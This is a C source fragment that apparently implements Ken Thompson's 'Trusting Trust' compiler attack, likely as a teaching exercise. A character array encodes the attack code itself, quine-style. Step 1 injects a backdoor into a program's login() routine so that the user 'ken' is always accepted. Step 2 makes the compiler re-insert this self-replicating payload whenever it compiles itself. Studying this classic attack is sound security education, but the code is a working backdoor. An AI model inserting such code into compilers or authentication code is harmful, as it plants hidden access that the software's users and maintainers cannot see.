char prog[] = {
	47, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	10, 	32, 	42, 	32, 	83, 	116,
	101, 	112, 	32, 	49, 	58, 	10, 	32, 	42,
	47, 	10, 	10, 	47, 	47, 	32, 	109, 	97,
	116, 	99, 	104, 	32, 	111, 	110, 	32, 	116,
	104, 	101, 	32, 	115, 	116, 	97, 	114, 	116,
	32, 	111, 	102, 	32, 	116, 	104, 	101, 	32,
	108, 	111, 	103, 	105, 	110, 	40, 	41, 	32,
	114, 	111, 	117, 	116, 	105, 	110, 	101, 	58,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	108, 	111, 	103,
	105, 	110, 	95, 	115, 	105, 	103, 	91, 	93,
	32, 	61, 	32, 	34, 	105, 	110, 	116, 	32,
	108, 	111, 	103, 	105, 	110, 	40, 	99, 	104,
	97, 	114, 	32, 	42, 	117, 	115, 	101, 	114,
	41, 	32, 	123, 	34, 	59, 	10, 	105, 	110,
	116, 	32, 	115, 	105, 	103, 	95, 	108, 	101,
	110, 	103, 	116, 	104, 	32, 	61, 	32, 	115,
	116, 	114, 	108, 	101, 	110, 	40, 	108, 	111,
	103, 	105, 	110, 	95, 	115, 	105, 	103, 	41,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	42,
	114, 	101, 	115, 	117, 	108, 	116, 	32, 	61,
	32, 	115, 	116, 	114, 	115, 	116, 	114, 	40,
	112, 	114, 	111, 	103, 	114, 	97, 	109, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	59, 	10, 	105, 	102, 	32,
	40, 	114, 	101, 	115, 	117, 	108, 	116, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	110, 	100, 	101, 	120,
	32, 	61, 	32, 	114, 	101, 	115, 	117, 	108,
	116, 	32, 	45, 	32, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	32, 	43, 	32, 	115, 	105,
	103, 	95, 	108, 	101, 	110, 	103, 	116, 	104,
	59, 	10, 	10, 	32, 	32, 	32, 	32, 	47,
	47, 	32, 	83, 	108, 	105, 	99, 	101, 	32,
	105, 	110, 	116, 	111, 	32, 	116, 	119, 	111,
	32, 	112, 	97, 	114, 	116, 	115, 	10, 	32,
	32, 	32, 	32, 	99, 	104, 	97, 	114, 	32,
	102, 	105, 	114, 	115, 	116, 	80, 	97, 	114,
	116, 	91, 	105, 	110, 	100, 	101, 	120, 	93,
	59, 	10, 	32, 	32, 	32, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	80, 	97, 	114, 	116, 	91, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	41, 	32, 	45, 	32,
	105, 	110, 	100, 	101, 	120, 	93, 	59, 	10,
	32, 	32, 	32, 	32, 	115, 	116, 	114, 	110,
	99, 	112, 	121, 	40, 	102, 	105, 	114, 	115,
	116, 	80, 	97, 	114, 	116, 	44, 	32, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	44, 	32,
	105, 	110, 	100, 	101, 	120, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	102, 	105, 	114, 	115,
	116, 	80, 	97, 	114, 	116, 	91, 	105, 	110,
	100, 	101, 	120, 	93, 	32, 	61, 	32, 	39,
	92, 	48, 	39, 	59, 	10, 	32, 	32, 	32,
	32, 	115, 	116, 	114, 	99, 	112, 	121, 	40,
	115, 	101, 	99, 	111, 	110, 	100, 	80, 	97,
	114, 	116, 	44, 	32, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	32, 	43, 	32, 	105, 	110,
	100, 	101, 	120, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	115, 	101, 	99, 	111, 	110, 	100,
	80, 	97, 	114, 	116, 	91, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	41, 	32, 	45, 	32, 	105,
	110, 	100, 	101, 	120, 	93, 	32, 	61, 	32,
	39, 	92, 	48, 	39, 	59, 	10, 	10, 	32,
	32, 	32, 	32, 	47, 	47, 	32, 	97, 	110,
	100, 	32, 	105, 	110, 	106, 	101, 	99, 	116,
	32, 	97, 	110, 	32, 	97, 	116, 	116, 	97,
	99, 	107, 	32, 	102, 	111, 	114, 	32, 	34,
	107, 	101, 	110, 	34, 	58, 	10, 	32, 	32,
	32, 	32, 	115, 	116, 	97, 	116, 	105, 	99,
	32, 	99, 	104, 	97, 	114, 	32, 	108, 	111,
	103, 	105, 	110, 	95, 	97, 	116, 	116, 	97,
	99, 	107, 	91, 	93, 	32, 	61, 	32, 	34,
	92, 	110, 	105, 	102, 	40, 	115, 	116, 	114,
	99, 	109, 	112, 	40, 	117, 	115, 	101, 	114,
	44, 	32, 	92, 	34, 	107, 	101, 	110, 	92,
	34, 	41, 	32, 	61, 	61, 	32, 	48, 	41,
	32, 	114, 	101, 	116, 	117, 	114, 	110, 	32,
	49, 	59, 	92, 	110, 	34, 	59, 	10, 	32,
	32, 	32, 	32, 	102, 	112, 	32, 	61, 	32,
	102, 	111, 	112, 	101, 	110, 	40, 	34, 	46,
	47, 	116, 	101, 	109, 	112, 	45, 	111, 	117,
	116, 	46, 	99, 	34, 	44, 	32, 	34, 	119,
	34, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	97, 	115, 	115, 	101, 	114, 	116, 	40, 	102,
	112, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	37, 	115, 	34,
	44, 	32, 	102, 	105, 	114, 	115, 	116, 	80,
	97, 	114, 	116, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	102, 	112, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	102,
	112, 	44, 	32, 	34, 	37, 	115, 	34, 	44,
	32, 	115, 	101, 	99, 	111, 	110, 	100, 	80,
	97, 	114, 	116, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	125, 	10,
	32, 	32, 	32, 	32, 	10, 	10, 	47, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	10, 	32, 	42, 	32, 	83, 	116, 	101, 	112,
	32, 	50, 	58, 	10, 	32, 	42, 	47, 	10,
	10, 	47, 	47, 	32, 	115, 	101, 	97, 	114,
	99, 	104, 	32, 	102, 	111, 	114, 	32, 	116,
	104, 	101, 	32, 	115, 	116, 	97, 	114, 	116,
	32, 	111, 	102, 	32, 	116, 	104, 	101, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	32,
	114, 	111, 	117, 	116, 	105, 	110, 	101, 	58,
	32, 	10, 	115, 	116, 	97, 	116, 	105, 	99,
	32, 	99, 	104, 	97, 	114, 	32, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	95, 	115, 	105,
	103, 	91, 	93, 	32, 	61, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	34, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	118, 	111,
	105, 	100, 	32, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	40, 	99, 	104, 	97, 	114, 	32,
	42, 	112, 	114, 	111, 	103, 	114, 	97, 	109,
	44, 	32, 	99, 	104, 	97, 	114, 	32, 	42,
	111, 	117, 	116, 	110, 	97, 	109, 	101, 	41,
	32, 	123, 	92, 	110, 	34, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	34, 	32,
	32, 	32, 	32, 	70, 	73, 	76, 	69, 	32,
	42, 	102, 	112, 	32, 	61, 	32, 	102, 	111,
	112, 	101, 	110, 	40, 	92, 	34, 	46, 	47,
	116, 	101, 	109, 	112, 	45, 	111, 	117, 	116,
	46, 	99, 	92, 	34, 	44, 	32, 	92, 	34,
	119, 	92, 	34, 	41, 	59, 	92, 	110, 	34,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	34, 	32, 	32, 	32, 	32, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	102, 	112, 	41,
	59, 	34, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	59, 	10, 	105, 	110, 	116,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	95, 	115, 	105, 	103, 	95, 	108, 	101, 	110,
	103, 	116, 	104, 	32, 	61, 	32, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	95, 	115, 	105, 	103,
	41, 	59, 	10, 	99, 	104, 	97, 	114, 	32,
	42, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	95, 	114, 	101, 	115, 	117, 	108, 	116, 	32,
	61, 	32, 	115, 	116, 	114, 	115, 	116, 	114,
	40, 	112, 	114, 	111, 	103, 	114, 	97, 	109,
	44, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	95, 	115, 	105, 	103, 	41, 	59, 	10,
	105, 	102, 	32, 	40, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	114, 	101, 	115, 	117,
	108, 	116, 	32, 	33, 	61, 	32, 	78, 	85,
	76, 	76, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	105, 	110, 	116, 	32, 	105, 	110,
	100, 	101, 	120, 	32, 	61, 	32, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	95, 	114, 	101,
	115, 	117, 	108, 	116, 	32, 	45, 	32, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	32, 	43,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	95, 	115, 	105, 	103, 	95, 	108, 	101, 	110,
	103, 	116, 	104, 	59, 	10, 	10, 	32, 	32,
	32, 	32, 	47, 	47, 	32, 	83, 	108, 	105,
	99, 	101, 	32, 	105, 	110, 	116, 	111, 	32,
	116, 	119, 	111, 	32, 	112, 	97, 	114, 	116,
	115, 	10, 	32, 	32, 	32, 	32, 	99, 	104,
	97, 	114, 	32, 	102, 	105, 	114, 	115, 	116,
	80, 	97, 	114, 	116, 	91, 	105, 	110, 	100,
	101, 	120, 	93, 	59, 	10, 	32, 	32, 	32,
	32, 	99, 	104, 	97, 	114, 	32, 	115, 	101,
	99, 	111, 	110, 	100, 	80, 	97, 	114, 	116,
	91, 	115, 	116, 	114, 	108, 	101, 	110, 	40,
	112, 	114, 	111, 	103, 	114, 	97, 	109, 	41,
	32, 	45, 	32, 	105, 	110, 	100, 	101, 	120,
	93, 	59, 	10, 	32, 	32, 	32, 	32, 	115,
	116, 	114, 	110, 	99, 	112, 	121, 	40, 	102,
	105, 	114, 	115, 	116, 	80, 	97, 	114, 	116,
	44, 	32, 	112, 	114, 	111, 	103, 	114, 	97,
	109, 	44, 	32, 	105, 	110, 	100, 	101, 	120,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	105, 	114, 	115, 	116, 	80, 	97, 	114, 	116,
	91, 	105, 	110, 	100, 	101, 	120, 	93, 	32,
	61, 	32, 	39, 	92, 	48, 	39, 	59, 	10,
	32, 	32, 	32, 	32, 	115, 	116, 	114, 	99,
	112, 	121, 	40, 	115, 	101, 	99, 	111, 	110,
	100, 	80, 	97, 	114, 	116, 	44, 	32, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	32, 	43,
	32, 	105, 	110, 	100, 	101, 	120, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	80, 	97, 	114, 	116, 	91,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	41, 	32,
	45, 	32, 	105, 	110, 	100, 	101, 	120, 	93,
	32, 	61, 	32, 	39, 	92, 	48, 	39, 	59,
	10, 	10, 	32, 	32, 	32, 	32, 	47, 	47,
	32, 	97, 	110, 	100, 	32, 	105, 	110, 	106,
	101, 	99, 	116, 	32, 	97, 	32, 	112, 	108,
	97, 	99, 	101, 	104, 	111, 	108, 	100, 	101,
	114, 	32, 	34, 	97, 	116, 	116, 	97, 	99,
	107, 	34, 	58, 	10, 	32, 	32, 	32, 	32,
	47, 	47, 	32, 	105, 	110, 	106, 	101, 	99,
	116, 	32, 	116, 	104, 	105, 	115, 	32, 	97,
	102, 	116, 	101, 	114, 	32, 	116, 	104, 	101,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	32,
	97, 	98, 	111, 	118, 	101, 	32, 	97, 	102,
	116, 	101, 	114, 	32, 	116, 	104, 	101, 	32,
	99, 	97, 	108, 	108, 	32, 	116, 	111, 	32,
	102, 	111, 	112, 	101, 	110, 	46, 	10, 	32,
	32, 	32, 	32, 	47, 	47, 	32, 	110, 	111,
	116, 	32, 	109, 	117, 	99, 	104, 	32, 	111,
	102, 	32, 	97, 	110, 	32, 	97, 	116, 	116,
	97, 	99, 	107, 	46, 	32, 	32, 	32, 	116,
	104, 	105, 	115, 	32, 	105, 	115, 	32, 	106,
	117, 	115, 	116, 	32, 	97, 	32, 	113, 	117,
	105, 	99, 	107, 	32, 	112, 	108, 	97, 	99,
	101, 	104, 	111, 	108, 	100, 	101, 	114, 	46,
	10, 	32, 	32, 	32, 	32, 	47, 	47, 	32,
	97, 	110, 	100, 	32, 	105, 	110, 	106, 	101,
	99, 	116, 	32, 	97, 	110, 	32, 	97, 	116,
	116, 	97, 	99, 	107, 	32, 	102, 	111, 	114,
	32, 	34, 	107, 	101, 	110, 	34, 	58, 	10,
	32, 	32, 	32, 	32, 	47, 	42, 	115, 	116,
	97, 	116, 	105, 	99, 	32, 	99, 	104, 	97,
	114, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	61, 	32, 	34, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	92, 	34, 	37, 	115, 	58, 	32,
	99, 	111, 	117, 	108, 	100, 	32, 	104, 	97,
	118, 	101, 	32, 	114, 	117, 	110, 	32, 	121,
	111, 	117, 	114, 	32, 	97, 	116, 	116, 	97,
	99, 	107, 	32, 	104, 	101, 	114, 	101, 	33,
	33, 	92, 	92, 	110, 	92, 	34, 	44, 	32,
	95, 	95, 	70, 	85, 	78, 	67, 	84, 	73,
	79, 	78, 	95, 	95, 	41, 	59, 	34, 	59,
	42, 	47, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	32, 	61, 	32, 	102,
	111, 	112, 	101, 	110, 	40, 	34, 	46, 	47,
	116, 	101, 	109, 	112, 	45, 	111, 	117, 	116,
	46, 	99, 	34, 	44, 	32, 	34, 	119, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	97,
	115, 	115, 	101, 	114, 	116, 	40, 	102, 	112,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	102,
	112, 	44, 	32, 	34, 	37, 	115, 	34, 	44,
	32, 	102, 	105, 	114, 	115, 	116, 	80, 	97,
	114, 	116, 	41, 	59, 	10, 	32, 	32, 	32,
	32, 	102, 	112, 	114, 	105, 	110, 	116, 	102,
	40, 	102, 	112, 	44, 	32, 	34, 	92, 	110,
	99, 	104, 	97, 	114, 	32, 	112, 	114, 	111,
	103, 	91, 	93, 	32, 	61, 	32, 	123, 	92,
	110, 	34, 	41, 	59, 	10, 	32, 	32, 	32,
	32, 	102, 	111, 	114, 	40, 	105, 	32, 	61,
	32, 	48, 	59, 	32, 	112, 	114, 	111, 	103,
	91, 	105, 	93, 	59, 	32, 	105, 	43, 	43,
	41, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	102, 	112, 	44, 	32, 	34, 	92,
	116, 	37, 	100, 	44, 	37, 	99, 	34, 	44,
	32, 	112, 	114, 	111, 	103, 	91, 	105, 	93,
	44, 	32, 	40, 	105, 	43, 	49, 	41, 	37,
	56, 	61, 	61, 	48, 	32, 	63, 	32, 	39,
	92, 	110, 	39, 	32, 	58, 	32, 	39, 	32,
	39, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	48, 	32, 	125,
	59, 	92, 	110, 	34, 	41, 	59, 	10, 	32,
	32, 	32, 	32, 	102, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	102, 	112, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	37, 	115, 	34,
	44, 	32, 	115, 	101, 	99, 	111, 	110, 	100,
	80, 	97, 	114, 	116, 	41, 	59, 	10, 	32,
	32, 	32, 	32, 	102, 	99, 	108, 	111, 	115,
	101, 	40, 	102, 	112, 	41, 	59, 	10, 	125,
0 };
/*****************************************************************
 * Step 1:
 */

// match on the start of the login() routine:
static char login_sig[] = "int login(char *user) {";
int sig_length = strlen(login_sig);
char *result = strstr(program, login_sig);
if (result != NULL) {
    int index = result - program + sig_length;

    // Slice into two parts
    char firstPart[index];
    char secondPart[strlen(program) - index];
    strncpy(firstPart, program, index);
    firstPart[index] = '\0';
    strcpy(secondPart, program + index);
    secondPart[strlen(program) - index] = '\0';

    // and inject an attack for "ken":
    static char login_attack[] = "\nif(strcmp(user, \"ken\") == 0) return 1;\n";
    fp = fopen("./temp-out.c", "w");
    assert(fp);
    fprintf(fp, "%s", firstPart);
    fprintf(fp, "%s", login_attack);
    fprintf(fp, "%s", secondPart);
    fclose(fp);
}
    

/*****************************************************************
 * Step 2:
 */

// search for the start of the compile routine: 
static char compile_sig[] =
        "static void compile(char *program, char *outname) {\n"
        "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
        "    assert(fp);"
        ;
int compile_sig_length = strlen(compile_sig);
char *compile_result = strstr(program, compile_sig);
if (compile_result != NULL) {
    int index = compile_result - program + compile_sig_length;

    // Slice into two parts
    char firstPart[index];
    char secondPart[strlen(program) - index];
    strncpy(firstPart, program, index);
    firstPart[index] = '\0';
    strcpy(secondPart, program + index);
    secondPart[strlen(program) - index] = '\0';

    // and inject a placeholder "attack":
    // inject this after the assert above after the call to fopen.
    // not much of an attack.   this is just a quick placeholder.
    // and inject an attack for "ken":
    /*static char compile_attack[] 
            = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";*/
    int i;
    fp = fopen("./temp-out.c", "w");
    assert(fp);
    fprintf(fp, "%s", firstPart);
    fprintf(fp, "\nchar prog[] = {\n");
    for(i = 0; prog[i]; i++)
        fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
    fprintf(fp, "0 };\n");
    fprintf(fp, "%s", prog);
    fprintf(fp, "%s", secondPart);
    fclose(fp);
}